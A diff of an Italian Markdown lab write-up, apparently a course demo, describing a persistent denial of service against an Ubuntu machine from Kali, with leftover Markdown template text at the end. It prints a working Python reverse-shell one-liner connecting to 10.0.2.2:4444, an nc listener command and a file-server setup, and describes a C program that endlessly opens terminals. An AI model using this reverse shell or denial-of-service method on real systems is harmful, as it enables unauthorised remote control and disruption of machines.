@@ -10,7 +10,7 @@ L'obiettivo della demo è di creare un Denial of Service persistente su una macc
 Per prima cosa sono stati creati tutti i file necessari su Kali.
 Per primo il file `reverseshell.sh`, dove è presente il [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl) in python 
 <pre>
-export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+export RHOST="10.0.2.2";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 </pre>
 che permette di creare la reverse shell quando eseguito sulla macchina attaccata.
 Poi, è stato creato un semplicissimo programma in C, `dos.c`, contenente un ciclo while infinito che continua ad aprire finestre di terminale:
@@ -42,12 +42,14 @@ Una volta creati i file, è stata creato anche un web file server sulla porta 80
 
 Per fare il Denial of service, per prima cosa è stata creata una reverse shell, in modo che dalla macchina Kali si potessero eseguire comandi sulla macchina ubuntu. Per fare ciò è stato utilizzado un [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#p erl) in python, è stato creato un file, chiamato reverseshell.sh.
 Preparazione Kali: utilizzando il comando `python -m http.server 80` è stato creato un web file server sulla porta 80. 
-![Web File Server](
+
+![Web File Server](images/webfileserverdemo.png)
+
+A questo punto, l'unica cosa che rimane da fare, è mettersi in ascolto sulla porta predefinita, per fare ciò è stato utilizzato il comando `nc -lvp 4444 -n`
 
 
 **Markdown** is a system-independent markup language that is easier to learn and use than **HTML**.
 
-![The Markdown Mark](images/markdown-red.png)  
 _Figure 1: The Markdown Mark_
 
 Some of the key benefits are:
